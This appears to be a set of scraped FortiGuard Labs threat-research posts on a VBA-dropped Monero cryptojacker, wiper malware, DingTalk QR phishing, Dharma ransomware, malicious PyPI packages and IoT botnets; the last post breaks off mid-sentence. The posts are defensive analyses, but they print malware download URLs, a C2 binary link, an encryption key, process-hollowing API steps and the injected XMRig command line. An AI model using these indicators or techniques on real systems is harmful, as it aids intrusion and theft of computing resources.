    "content": "FortiGuard Labs Threat Research FortiGuard Labs recently captured Excel documents in the Microsoft OLE Compound File format that contain malicious VBA Macros. Their file names are Pago_detalles.xls, makbuzu.xls, and Pago.xls. I then conducted deep research on them and found that they all belong to the same malicious campaign that cryptojacks systems to mine for Monero (XMR) cryptocurrency. Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Cryptojack Victim’s Device to Mine CryptocurrencySeverity level:Critical In this analysis, I will show how the crypto miner software is delivered by opening the Excel document and how it is executed on a victim’s device. I also look at the techniques it uses to prevent its code from being analyzed, how it gains persistence on the victim’s device, and how the malware performs process hollowing to execute the Monero miner on the victim’s device. The content and VBA project are similar in all three Excel documents. When the document is opened in Microsoft Excel, as shown in Figure 1.1, it pops up a yellow warning bar to alert the user that the document contains a risky Macro project, which will be executed once the “Enable Content” button is clicked. Given that the content is written in Spanish, this campaign targets Spanish-speaking people. It shows a blurred picture of a statement that tricks the user into clicking the button on the yellow bar for a clearer view. The VBA Macro project is password protected from viewing, editing, and debugging. Once I disarmed its protections, I found an auto-execution sub-procedure Workbook_Open() in the project that is executed automatically once the Excel document is opened. After deobfuscating the VBA statements, it is easy to understand the purpose of the sub-procedure Workbook_Open(), as shown in Figure 1.2. It downloads a file from hxxps[:]//www[.]tractorandinas[.]com/wocontent/templates.exe, saves it into the system’s Templates folder, and renames it “GHJFRGUNL.exe”. At the end of the Workbook_Open() auto-run procedure, it calls “FPKGNSJJDW_Shell_Application.Open (VMNXMOV_local_file)” to run the downloaded file on the victim’s device. The downloaded file “GHJFRGUNL.exe” was developed using Microsoft .Net Framework and is protected by an obfuscator called “ConfuserEx v1.0.0”. By deobfuscating the file, I located a .Net Exe file, which is easier for analysts to use to comprehend its work-flows. It contains a .Net resource, which can be obtained with its resource name “Fyyxdkrpjokzonmmc” by calling the API ResourceManager.GetObject(). Figure 2.1 is a screenshot of the deobfuscated Exe file in an analysis tool. The .Net resource is shown on the right. The resource's data is a GZip-compressed .Net module (DLL) file. It is extracted in memory and then loaded. Figure 2.2 shows the context code of doing that. Next, it gets the type of the entry point function for the .Net module and calls it by calling the API Type.InvokeMember(). The function is named \"YLbTOcLUZT\" and is defined under the namespace.class “DKNYEHTGFSSZDfys0h6.dOICUYTjc8hIf6usABv”. Figure 2.3 shows the dynamically loaded .Net module in a .Net debugger, where it breaks at the entry point function. As you may have noticed, the module is thoroughly obfuscated, including the class name, variable names, obfuscated workflow, and more. It also includes functions to perform anti-tamper checks during the run time. These cause the system to crash if it detects any modifications made to the module. That means that it’s hard to deobfuscate. This was my biggest challenge in analyzing it. According to my analysis, the downloaded file is like a malware loader and installer, and the .Net module is the payload module for the malware. The payload module determines if the current process file (“GHJFRGUNL.exe”) is located in the system “%AppData%” folder and runs with Administrator privilege. If not, it will exit the process and rerun it with Administrator privilege, popping up a message for the victim to confirm. It copies the Exe file into the “%AppData%” folder and adds it to the system Task Scheduler. This ensures the process launches at startup and runs every two minutes. It breaks at a function, as shown in Figure 3.1, where it uses a TaskScheduler object to create the new task with the TaskDefinition displayed at the bottom. The new task’s name is from the process name “GHJFRGUNL”. Figure 3.2 is the screenshot of the system Task Scheduler. You can see that a new task has been created with the process name. Once completed, it can launch at system startup. The Task Scheduler repeatedly starts “GHJFRGUNL.exe” every two minutes in case the process or its sub-processes are killed by the victim due to high consumption of hardware resources (like CPU and memory). It also has a strategy for keeping only one process running simultaneously using a Mutex object. Its config block data is base64 encoded in the payload module (“Fyyxdkrpjokzonmmc.dll”), which is decoded and loaded in a config block. This contains the malware configuration data, like flags that tell the malware how to work, its C2 server domain string and port numbers, malware variant name, and crypto key used to encrypt and decrypt packets between the client and C2 server. The decoded config block data is a stream of bytes converted into an object by calling the Deserialize()function(from a third-party module, protobuf-net.dll). The config object is used throughout the payload module lifetime. Figure 4.1 is a screenshot of the config data being deserialized into a global variable. There are two TCP port numbers in the config object. It repeatedly attempts to connect to the C2 server with two ports, one by one, until a connection is established. Next, it gathers basic information from the victim’s device, encrypts the collected information, and sends it to its C2 server. Figure 4.2 shows when the malware is about to call a function to encrypt the collected information carried by variable “u” and send it to the C2 server. The collected information consists of many of the items shown below: It uses a Triple DES cipher algorithm to encrypt and decrypt the data between the malware and its C2 server. Figure 4.3 shows the encrypted packets captured by Wireshark. The cryptography key is \"57dd8b6cc78fd8f51c2f5a\", taken from the config object. Steps for sending data to the C2 server Steps for receiving data from the C2 server Figure 4.4 shows the entire set of received data responding to the first packet with collected information to the C2 server. It has been converted into an object variable (referred to as a response object) from a byte stream. The response object leads the malware to execute further unauthorized actions on the victim’s device. In the response object, there are two Onedriver URLs from which the malware will download two files. The two MD5 values in the response object are the hash values of the two files. It does not save the files to local folders but to the system registry under its sub-key, as shown in Figure 4.5. The sub-key name “96f709c1c080fbcb92806bd724266a03” is the victim ID, as I mentioned earlier. It is generated with the device hardware information. The names of the values are the two files’ MD5 values, and the data is the content of the two files. It won’t download the two files if the relevant registry values exist. Both of them are compressed PE files, which are named “plugin_3.dll” (File size: 2.3Mb, MD5:78B10BAE1DB822E486A2393F0ADBE627) and “plugin_4.dll” (File size: 37Kb, MD5: A722D3BCD1D9056D1BBE840197059BCE) on the website. To explain how they work together, I will refer to them by their names. Decompressing “plugin_4.dll” gets a .Net dll file (“ClassLibrary1.dll”), which is used to perform process hollowing. “plugin_3.dll” contains an Exe file (“xmrig.exe”, the XMR Miner) that will be injected into another process by “plugin_4.dll”. The payload module (“Fyyxdkrpjokzonmmc”) proceeds to dynamically load “ClassLibrary1.dll”, which is also thoroughly obfuscated. Its function, Plugin.Plugin.Run(), is the entry point function for process hollowing. After “xmrig.exe” is decompressed in memory, as shown in Figure 5.1, it calls the API CreateProcess() to create a process called \"AddInProcess.exe\", which is from the response object (refer to Figure 4.4). The function parameter Creation Flag is 12 (i.e.,CREATE_SUSPENDED | DETACHED_PROCESS). Later, it calls a bunch of key Windows APIs, such as VirtualAlloc(), GetThreadContext(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(), to deploy the “xmrig.exe” into the newly-created “AddInProcess.exe” process. Afterward, “xmrig.exe” runs as “AddInProcess.exe”, and the malware payload module becomes the daemon process to the process-hollowed process to prevent it from being killed. XMRig is a high-performance, open-source, cross-platform (Windows, Linux, Android, and macOS) cryptocurrency miner application, which is both a CPU and GPU miner supporting RandomX, KawPow, CryptoNight, and GhostRider algorithms. However, this platform is also commonly abused by cybercriminals to perform cryptojacking, which means hackers hijack the victim’s computing resources to mine cryptocurrencies on their behalf. “xmrig.exe” is XMrig’s Windows version application. It can use the CPU to mine for Monero coins. I manually decompressed the miner application from the downloaded “plugin_3.dll” into “plugin_3_1.exe”. You can see the detailed properties of this file in Figure 6.1. Taking a look back at the Process Hollowing section, it created a suspended new process of “AddInProcess.exe”. Other than the Creation Flag to API CreateProcess(), it also has a Command Line parameter, like “C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInProcess.exe -o xmr.2miners.com:13333 -u 88hKxLYFGsx4U{…}eF.Rig998 -p x --tls --algo rx/0 --cpu-max-threads-hint=50\". The parameter string is from the response object (refer to Figure 4.4). It is not a parameter to the created “AddInProcess.exe” but for the xmrig.exe that has been injected into it. The following table contains a description for each of the options: -o, --url=URL It specifies the mining server and port. -a, --algo=ALGO It specifies mining algorithm to be used. -u, --user=USERNAME It is the hacker’s wallet address. -p, --pass=PASSWORD It is the password for mining server. --tls It enables SSL/TLS support. --cpu-max-threads-hint=N It specifies the maximum CPU threads count (in percentage) hint for autoconfig Figure 6.2 shows how XMRig is mining Monero for the attacker. In this analysis, we walked through the entire process, from executing the VBA code in the Excel document to downloading an executable file (template.exe or GHJFRGUNL.exe). Next, I explained how the payload .Net module is extracted from the executable file and executed. Then, you learned how the malware communicates with its C2 server and what control data (Monero miner) is received. Last, I elaborated on how it injects a Monero miner into another process (“AddInProcess.exe”) by executing process hollowing to mine Monero on the attacker’s behalf. Below is a workflow chart that depicts the entire process. Fortinet customers are already protected from this campaign with FortiGuard’s Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious VBA project inside the Excel document. The relevant samples are covered and blocked by the FortiGuard Antivirus service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.

    "content": "FortiGuard Labs Threat Research Outbreaks have been a continued and critical element of 2022—no, not that type of outbreak. We’re talking about FortiGuard Outbreak Alerts. During the SolarWinds Orion supply chain attack at the end of 2020, a number of our customers asked us to help them determine whether their Fortinet solutions had protected them against its multiple attack vectors, malware, resulting lateral movement, and command and control activity. While all of this information existed, we wanted to make it more readily available for customers. So, to help our customers more rapidly determine whether they had been protected against an attack and to better enable rapid threat hunting to identify Indicators of Compromise (IoCs) across their network, we developed theFortiGuard Outbreak Alertsand correspondingFortiGuard Outbreak Detection Service. In the years since, we have enhanced this service to include the following: These enhancements enable customers to react quickly to emerging outbreaks with factual, actionable intelligence. In 2022, FortiGuard IPS and FortiGuard AV/Sandbox blocked three trillion and six trillion hits, respectively, from vulnerabilities, malware, and 0-day attacks. Those hits encompassed several thousand varieties of remote code lifecycle components, including attack execution,cross-site scripting(XSS), the elevation of privilege, denial of service (DoS and DDoS), Trojans, and other exploits. FortiGuard Labs also alerted customers to numerous critical threats throughout the year based on factors such as proof-of-concept, attack vectors, impact, ease of attack, dependencies, and more.

    "title": "The Year of the Wiper",
    "link": "https://www.fortinet.com/blog/threat-research/the-year-of-the-wiper",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has been actively tracking wiper malware targeting Ukrainian organizations since the start of the 2022 Russia-Ukraine conflict. The sudden spike in wiper malware began early in the year with numerous new wiper samples targeted at Ukraine. It displayed a side of cyberattacks we rarely see: pure destruction. We published anarticlelast April 2022 to help people understand the context, history, and technical setup of wiper attacks. This post focuses on what happened the rest of the year and how wiper malware and their attack scenarios have changed. Affected Platforms:MultipleImpacted Users:Large organizationsImpact:Data loss and OS and file corruptionSeverity Level:High Since that last report, quite a few new samples have been launched. Figure 1 shows an updated version of a timeline we have used in the past. In April, we were already surprised by the significant increase in wipers. As you can see, it increased even further over the rest of the year. Much of the wiper malware seen in the first half of 2022, whether attributed or not, was deployed against Ukrainian organizations. These include HermeticWiper, CaddyWiper, IsaacWiper, WhisperGate, and others. When you think about it, the growth in wiper malware during a conflict is hardly a surprise. It can scarcely be monetized. The only viable use case is destruction, sabotage, and cyberwar. One interesting event was the AcidRain wiper malware that targeted the satellite modems of a global satellite communications provider, which caused modems to lose connections to their satellite network. The message was clear: even if a cyberattack is used to target Ukraine, its effects can easily spill over and affect other countries and organizations. It is vital that we track these new highly malicious attacks. As the year progressed, pro-Russian hacktivism also increased. We saw that in our telemetry, showing, for example, an increase in DDOS attacks in Nordic countries, especially Finland (Figure 2). However, hacktivism is usually associated with DoS and defacement attacks. But this time, some actors began repurposing their ransomware as wipers by not providing a decryption key. And if no decryption is provided, then ransomware essentially acts as a wiper. We saw actors begin to do this intentionally. For instance, the Somnia ransomware was deployed at several Ukrainian organizations. The attackers compromised systems using a fake software installer and established a persistent presence. Like most ransomware attacks, they exfiltrated data and kept their access as long as needed. But at the end of the attack, no decryptor was offered, meaning the files remained encrypted and useless. The most intriguing wiper we documented in the second half of 2022 was one named ‘Azov.’ Its second version quickly drew media attention because it delivered a message written in the name of well-known security researchers. These researchers denied any connection to the malware. It also delivered a pro-Ukrainian message claiming it was using the malware to draw more attention to the Ukraine-Russia war. However, so far, no attribution has been made. However, as it turned out, the message was not the most interesting part of the malware. It is also very compelling from a technical perspective. First, it was written in the assembly language and built with the FASM tool. This is unusual because most new malware is written in languages such as python, .NET or C/C++. It also contradicts everyone’s first impression that it was a prank used to blame security researchers. However, it seems unlikely that anybody would go to the effort to write malware in assembly just for a joke. It also implements polymorphic code creation to inject itself into legitimate EXE files on the infected machine. It then executes a backdooring function by injecting a modified version of itself into EXE files. This provides persistence to the malware because it can run again once the backdoored files are executed. It also implements a variety of anti-analysis techniques: All this demonstrates that this malware was not created for fun. It is a sophisticated wiper that implements a variety of modern techniques, clearly showing that a sophisticated threat actor. Ransomware authors understand that encryption speed is often crucial for a successful operation. Once encryption is started, they are in a race against the incident response team, who might detect them at any time. As a result, performance optimization was developed. Some new ransomware now implements a multi-threaded architecture that enables it to run multiple encryption threads in parallel. Other operators have realized that encrypting files in their entirety is time-consuming—and may not even be necessary. The BlackCat ransomware, for instance, implements multiple different encryption strategies with varying improvements in performance (see thisVirusBulletin presentation). A similar problem exists for wipers. Traditionally, wipers would erase an entire disk using a kernel driver, delete files using different techniques, and/or alter the content of files (more on techniques in ourlast article). These all take time. As a result, some authors began experimenting with performance optimization. The DoubleZero wiper, for instance, only erases the first 4096 bytes of targeted files. This means that most of the data in an average file would not be erased. However, it’s also true that restoring these files at scale would be very impractical. For instance, modern Microsoft .docx files are essentially a collection of compressed XML files. Deleting the first 4096 bytes from them would corrupt the compression and the generic file structure, meaning these files would not work anymore. Recreating a functioning file with manual forensic work might be possible, but it is simply not feasible when dealing with hundreds or thousands of files. The Azov wiper also implemented a somewhat more optimized wiping process. It does not remove all data in each file. Instead, it only targets 666 bytes in an alternating pattern (666 bytes overwritten, 666 bytes intact, 666 bytes overwritten, etc.) up to 4 GB. OT environments also saw their fair share of wipers. We already mentioned the attack against the satellite provider (and, by extension, the German windmills). Another interesting attack using the Industroyer.V2 malware targeted a Ukrainian high-voltage electric substation. That attack aimed to manipulate the electric relays to take the substation offline. In the context of OT, I would consider the use of the Industroyer.V2 malware in this context as a wiper. Traditional IT wipers have the goal of destroying the crown jewels of IT, the data. Industroyer.V2 was used to destroy the crown jewel of that substation, its operation. If this was not enough, the Industroyer.V2 malware was deployed along with three other wipers, potentially from different actors: This helps serve as a reminder that OT environments are being actively targeted by different threat actors, ranging from ransomware operators to state-sponsored APTs. An interesting new project to pay attention to is the Endurance wiper. It is an open-source wiper that seemingly aspires to become ransomware. Figure 3 shows the malware’s features and readiness state as described by the author. Currently, Endurance’s file-wiping capabilities offer three wiping modes, with each mode defining how many times content should be overwritten. It also offers CONTENT deletion and FILE deletion functions. The CONTENT deletion (Figure 4) function is responsible for overwriting the contents of a file on disk. The FILE deletion function (Figure 5) updates all file attributes and then erases the file from the disk. This tool is actively in development, although at the time of testing, we had to fix the code  build it. Since it is open-source, this could provide an easy entry point for attackers wanting to join the wiper/ransomware game. 2022 provided us with new perspectives on destructive malware. We saw different wiping techniques, different motivations, and differentmotivations, actors, and deployment scenarios. New wiper instances, such as the Azov and Endurance wipers, show that actors are actively engaged in increasingly malicious activity. They are also trying to address shorter threat detection and response time by effectively optimizing the performance of their wiping strategies. And we are also seeing increased attention being paid to OT networks, such as the example of the Industroyer.V2 malware. The point is clear. The gloves are off as threat actors increasingly engage in attacks designed with one purpose: to destroy their targets.

    "link": "https://www.fortinet.com/blog/threat-research/qr-code-phishing-attempts-to-steal-credentials-from-chinese-language-users",
    "content": "FortiGuard Labs Threat Research Every day, millions of internet and application users enter the ubiquitous username and password in the myriad of places where they shop, work, pay bills, socialize, and stream entertainment. This practice carries significant risk. If one of those locations is compromised, that username and password information usually finds its way to dark web markets where it is offered for sale. And those credentials can be very valuable (and costly to the owner!) if they can be reused in places like a financial institution or online shopping site that have monetary value for the criminal. Affected Platforms:Mobile and DesktopImpacted Users:Mobile and DesktopImpact:Potential to steal credentialsSeverity Level:Medium Cybercriminals use a variety of techniques designed to steal credentials. FortiGuard Labs recently discovered an interesting phishing campaign using a variety of QR codes to target Chinese language users. It aims to steal credentials by luring users into entering their data into a phishing website owned by the threat actor. The e-mail is reasonably simple and streamlined and contains a Microsoft Word attachment. The e-mail attempts to spoof the Chinese Ministry of Finance. Translated to English, the e-mail subject in Figure 1 reads: “Re: Notice on the application for personal labor subsidies in 2022”. The body states, “Please click on the attachment to view the notification of the Ministry of Finance's application for personal labor subsidies in the fourth quarter of 2022!”. The Microsoft Word attachment, “转发：关于财四季度个人劳动补贴申领通知.docx” translates to: “Forward: Notice on Application for Personal Labor Subsidy in the Fourth Quarter of Fiscal Year.docx.” 转发：关于财四季度个人劳动补贴申领通知.docx Once the attachment is opened, the user is presented with some text and a large QR code in the center of the document. A QR code requires an application to read and translate it into something actionable. Most mobile phones have this functionality through their camera, and software packages are available on all major platforms to do this from a computer. In each of the examples FortiGuard Labs found, the QR code contained in the Microsoft Word attachments provided a URL for the user to follow. When the user does this using their desktop platform or mobile device, they arrive at a website controlled by the threat actor. FortiGuard Labs reviewed the linked website. It is a spoofed facsimile of a DingTalk instance (it should be noted that as of the publication date, this site is now offline).DingTalkis a broadly used enterprise communication platform developed by Alibaba Group. Given the reach of the platform and its large number of users, credentials for it would be valuable. The user is directed to a pop-up message box that suggests their DingTalk account has committed some unspecified business violation(s) and that it will be frozen without verification in 24 hours. After acknowledging the message box, the user is invited to enter their credentials to address the issue. Credentials provide a valuable resource for criminals and threat actors by providing a direct route into a victim’s applications or environment. These may be used directly or sold to another group for use in their operations. This example shows that attackers are putting significant effort into ensuring their landing pages look as realistic as possible and that their lures can convince victims to let down their guard. Whatever the attacker's motives, these attacks will undoubtedly be prevalent for some time. Users are cautioned to verify emails, not open attachments or links, and never enter credentials into a site they have not seen before. Rather than using a received link, users are encouraged to go to the known main site of the vendor to conduct any business. Users can also hover over a link to look for an unusual URL. Organizations are also encouraged to provide training to users to help them identify and avoid malicious email attachments and links. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog MSWord/Phish.CCFD!tr Data/Phish.9C34!phish The WebFiltering client blocks all network-based URIs.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report provides readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers variants of the CrySIS/Dharma ransomware family. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High The CrySIS/Dharma ransomware family has been around for several years – dating to at least 2016. It nominally operates using a Ransomware-as-a-Service (RaaS) model. However, it should also be noted that at least one version of the ransomware had its source code leaked, allowing anyone to purchase and repurpose it for their own ends. Due to this proliferation of versions, it’s become a game of “whack-a-mole” when new ones pop up with different operators. Several methods have been used by CrySIS/Dharma operators to gain access to an environment—most famously, exposed Microsoft Remote Desktop Protocol (RDP) servers. It has also been delivered via phishing with attachments disguised as installation files for legitimate software, including AV vendors. When launched, the ransomware sets the console to codepage 1251, which covers the ability to use Cyrillic languages such as Russian, Ukrainian, and Bulgarian. It also deletes shadow copies of the system to hamper any attempts at recovery. An additional copy of the ransomware is copied to the host’s “~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” folder to ensure it runs in the event the system is restarted before encryption has occurred. All files of interest, such as personal and operational documents (it does not touch system files), are then subjected to encryption. Encrypted files have an extension generally referring to the threat actor controlling the ransomware. These tend to vary widely, as seen in the following images. In an unusual step, once encryption is complete, the malware launches the Microsoft HTML Application (MSHTA) to process and display a file called “Info.hta”. Copies of this file are stored in four separate locations on the host: “Info.hta” is essentially an HTML file containing the ransom's details. While there are variations in the ransom notes, all contain a method to contact the attacker to discuss the details of the ransom. A unique ID, which appears to be based on the characteristics of the victim system, is also displayed. In addition to its “Info.hta” file, a separate file called “info.txt” is also dropped. It contains a truncated set of instructions to contact the attacker. A copy is dropped at the following locations: Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known CrySIS/Dharma ransomware variants with the following AV signatures: File-based IOCs: SHA256 419bc8196013d7d8c72b060da1a02d202d7e3eb441101f7bcb6d7667871a5c16 5c2fb1c42f007093be5e463f70ee7e7192990b3385a3cbcc71043980efa312e0 6a0017262def9565b504d04318c59f55bea136ac3dd48862d1ae90ff6b963811 b557bf11d82d3d64d028a87584657d25dba0480295ed08447f10c7a579dee048 b3984a2de76eee3ad20c4b13e0c0cbbab2dd6db65e3f6ca34418e79c21cf5c39 e9253218e30b30c8bb690b2ab02eef47b8b5c8991629d814b2af6664151e9a2f Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "content": "FortiGuard Labs Threat Research TheFortiGuard Labsteam has discovered a new 0-day attack embedded in three PyPI packages (Python Package Index) called ‘colorslib’, ‘httpslib’, and “libhttps”. They were found on January 10, 2023, by monitoring an open-source ecosystem. The Python packages “colorslib” and “httpslib” were published on January 7, 2023, and “libhttps” was published on January 12, 2023. All three were published by the same author, ‘Lolip0p’, as shown in the official PyPI repository.  ‘Lolip0p’ joined the repository close to the publish date. The author puts the project description that may look legitimate and clean as shown below. All versions of these packages are malicious. Interestingly, when we look at the setup.py script for these packages, we find they are identical. They try to run a PowerShell with a suspicious URL that needs further analysis: https://dl[.]dropbox[.]com/s/mkd3enun97s8zag/Oxzy[.]exe?dl=0 As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 8dc8a9f5b5181911b0f4a051444c22e12d319878ea2a9eaaecab9686e876690b While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable is called ‘Oxyz.exe’. It drops another executable, ‘update.exe’, that runs in the folder ‘%USER%\\AppData\\Local\\Temp\\’ As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 293a3a2c8992636a5dba58ce088feb276ba39cf1b496b336eb7b6f65b1ddb757 When running ‘update.exe’, it drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’. The dropped file, ‘SearchProtocolHost.exe’, is flagged as malicious by several vendors (SHA 256): 123fd1c46a166c54ad66e66a10d53623af64c4b52b1827dfd8a96fdbf7675638 In this blog, we showed a single author posting separate Python packages that use the same code to launch an attack. The author also positions each package as legitimate and clean by including a convincing project description. However, these packages download and run a malicious binary executable. Python end users should always perform due diligence before downloading and running any packages, especially from new authors. And as can be seen, publishing more than one package in a short time period is no indication that an author is reliable.

    "title": "2022 IoT Threat Review",
    "link": "https://www.fortinet.com/blog/threat-research/2022-iot-threat-review",
    "content": "FortiGuard Labs Threat Research FortiGuard Labsmonitors the IoT botnet threat landscape for new and emerging campaigns. We do this with the assistance of our honeypots we have deployed to capture active attacks in the wild. This article provides insights into the data collected from our monitoring system over the past year. Affected Platforms:Linux Impacted Users:Any organization Impact:Remote attackers gain control of the vulnerable systems Severity Level:Critical Our distributed honeypot systems allow us to capture and monitor campaigns that are actively targeting IoT devices for infection. In most cases, these devices are turned into bots used to perform Distributed Denial of Service (DDoS) attacks. These malware campaigns primarily brute force Telnet and SSH credentials to gain access to IoT devices and then execute their bot binaries. In 2022, a total of over 20 million successful brute force attacks were recorded by our system. Figure 1 shows the number of successful brute force attacks against our honeypots by month. Based on 121,799 unique attacker IPs observed in 2022, see a breakdown of where IPs were hosted by country (Figure 2). In terms of attack volume, see a breakdown of where the majority originate from based on where servers are hosted (Figure 3). Aside from brute forcing credentials to infect devices, IoT malware also takes advantage of vulnerabilities to spread, such as in theBeastmode Miraicampaign we discussed in April. Our monitoring system identifiespossible exploitation requests being used by malware samples. From over a hundred vulnerabilities targeted by IoT malware samples that were captured last year, we primarily observed attempts to exploit CVE-2017-17215, an old Remote Code Execution (RCE) vulnerability targeting Huawei HG532 routers. In fact, over 30% of the malware samples containing embedded exploits target this vulnerability (Figure 4). In terms of the actual volume of attacks in the wild, based on 30-day Fortinet IPS telemetry, we can see that the IPS signatureHuawei.HG532.Remote.Code.Executiondetected efforts to exploit CVE-2017-17215. We captured an average of 80,000 daily detections, peaking at 160,000. We also found the following CVEs from 2022 being targeted: It is important to note that although there were attempts to target Local File Inclusion (LFI) vulnerabilities, they were not properly implemented to successfully exploit them. The most actively exploited vulnerability from the list above is the CVE-2022-22954. It targeted VMware Workspace ONE Access. TheVMware.Workspace.ONE.Access.Catalog.Remote.Code.ExecutionIPS signature recorded an average of 80,000 daily detections based on a 30-day Fortinet IPS telemetry. Ourpostfrom October noted that this vulnerability is also a hot target for other non-IoT malware campaigns. We also observed that the F5 BIG-IP iControl CVE-2022-1388 (F5.BIG-IP.iControl.REST.Authentication.Bypass) was another popular vulnerability, experiencing a daily average of 25,000 hits, peaking at 50,000. Based on our research, the majority of IoT malware is built to run on an ARM 32-bit architecture— comprising almost three-quarters of all samples captured (Figure 8). The “script file” label is for plaintext Bash scripts with the purpose of downloading and installing the payload binary after brute forcing or exploitation. Figure 9 shows the most common malware families detected by our systems, grouped by month. Mirai and Gafgyt variants are predominant, with Kyton, a Gafgyt/Mirai hybrid, being one of the most heavily distributed families in terms of volume. Being a Gafgyt/Mirai hybrid, Kyton reuses code from other Mirai variants to exploit CVE-2017-17215 (Huawei Router HG532), JAWS Webserver RCE, or CVE-2014-8361 (RealtekSDK). Samples tagged as_unknownon the graph (Figure 9) are malware yet to be linked to any known malware campaigns. They could be fresh botnets infecting our honeypots. As shown in the Figure 9 statistics, while most of the active IoT botnets last year were based on Mirai and Gafgyt, there were several campaigns that stood out from the crowd. In mid-March, for example, we encounteredEnemybot, which at the time was the latest botnet campaign from the threat group Keksec. It was a hybrid of Gafgyt and Mirai and was using the TOR network to mask its real Command and Control (C2) servers. RapperBotis a DDoS botnet that we encountered in mid-June. This malware is interesting because it was using an embedded SSH client to spread and because we observed unusual changes to its variants that made us question its primary motivation. In October 2022, we observed a newcampaignfrom potentially the same threat actors targeting servers for popular games. Lastly,Zerobotis a DDoS botnet written in the Go programming language (also known as Golang) that FortiGuard Labs first encountered in November 2022. It utilizes both old and recent vulnerabilities to spread, and uses WebSockets to communicate with its C2 servers. Another trend that we saw with IoT botnets was the rise of samples written in Golang despite its compiled binaries having relatively much larger file sizes. A Golang ELF binary executable can easily be above 4MB in size, whereas normal Mirai and Gafgyt binaries fall below 300KB. For this reason, some campaigns use the UPX packer to help reduce the file size. Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with thezero.{arch}filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots. In early November 2022, we collected samples of a DDoS botnet that supports only TCP-based DDoS attacks. This botnet is named Rose, based on the source code previously hosted on GitHub. Interestingly, the bot configures ZTE and Huawei devices to prevent their exploitation, similar to the Mozi botnetreportedby Microsoft. We also came across a simple DDoS bot that calls itself “nyancat” (Figure 11), as seen in the path of the source files used to compile the binary. The path also suggests that the bot was compiled in a Windows environment. This bot extends publicly available botnet code on GitHub to perform HTTP-based Denial of Service (DoS) types of attacks on top of existing TCP, UDP, and Valve Source Engine (VSE) attacks. Interestingly, we found another DDoS botnet also compiled in Windows from the same source file base path (Figure 12),C:/Users/Admin/Music. This botnet also looks like an adaptation of another source code on GitHub that supportsHTTP GET, HULK, GoldenEye,TLS and basic TCP and UDP types of DoS attacks (Figure 13). It’s possible that these two samples were compiled by the same threat actor, given that the binaries were built from source code located in similar directories on Windows machines and that some of the functions share similar names and code. Another malware we captured is Panchan (Figure 14), a Golang-based XMRig miner that wasdocumentedby Akamai around June 2022 but with earlier samples found as early as March. IoT malware is very much alive and continues to exploit both old and new vulnerabilities to infect devices and propagate themselves. While most of them target router vulnerabilities, there are 